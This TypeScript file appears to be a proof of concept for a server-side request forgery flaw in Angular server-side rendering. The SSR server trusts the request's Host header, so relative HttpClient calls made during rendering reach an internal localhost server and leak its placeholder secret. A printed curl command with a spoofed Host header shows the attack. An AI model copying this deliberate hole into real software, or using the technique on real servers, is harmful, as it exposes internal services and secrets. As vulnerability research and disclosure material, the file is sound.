import '@angular/compiler';
import 'zone.js/node';

import http from 'node:http';

import {HttpClient, HttpClientModule} from '@angular/common/http';
import {APP_INITIALIZER, Component, NgModule} from '@angular/core';
import {BrowserModule} from '@angular/platform-browser';
import {INITIAL_CONFIG, renderModule, ServerModule} from '@angular/platform-server';
import {firstValueFrom} from 'rxjs';

const INTERNAL_PORT = 4401;
const SSR_PORT = 4400;
const INTERNAL_SECRET = 'INTERNAL_SECRET_123';
let secretValue = 'unset';

@Component({
  selector: 'app',
  template: `<div id="secret">{{secret}}</div>`,
})
class AppComponent {
  secret = secretValue;
}

@NgModule({
  imports: [BrowserModule, ServerModule, HttpClientModule],
  declarations: [AppComponent],
  bootstrap: [AppComponent],
  providers: [
    {
      provide: APP_INITIALIZER,
      multi: true,
      deps: [HttpClient],
      useFactory: (httpClient: HttpClient) => async () => {
        secretValue = await firstValueFrom(
          httpClient.get('/secret', {responseType: 'text'} as {responseType: 'text'}),
        );
      },
    },
  ],
})
class AppServerModule {}

function startInternalServer(): http.Server {
  const server = http.createServer((req, res) => {
    if (req.url === '/secret') {
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.end(INTERNAL_SECRET);
      return;
    }

    res.writeHead(404, {'Content-Type': 'text/plain'});
    res.end('not found');
  });

  server.listen(INTERNAL_PORT, '127.0.0.1');
  return server;
}

function startSsrServer(): http.Server {
  const server = http.createServer(async (req, res) => {
    const hostHeader = req.headers.host || `127.0.0.1:${SSR_PORT}`;
    const reqUrl = req.url || '/';
    const url = `http://${hostHeader}${reqUrl}`;

    try {
      const html = await renderModule(AppServerModule, {
        document: '<app></app>',
        url,
        extraProviders: [
          {
            provide: INITIAL_CONFIG,
            useValue: {document: '<app></app>', url},
          },
        ],
      });

      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (err) {
      res.writeHead(500, {'Content-Type': 'text/plain'});
      res.end(String(err));
    }
  });

  server.listen(SSR_PORT, '127.0.0.1');
  return server;
}

function main(): void {
  startInternalServer();
  startSsrServer();
  console.log(`Internal server: http://127.0.0.1:${INTERNAL_PORT}/secret`);
  console.log(`SSR server:      http://127.0.0.1:${SSR_PORT}/`);
  console.log(
    `Attack demo: curl -H 'Host: 127.0.0.1:${INTERNAL_PORT}' http://127.0.0.1:${SSR_PORT}/`,
  );
}

main();
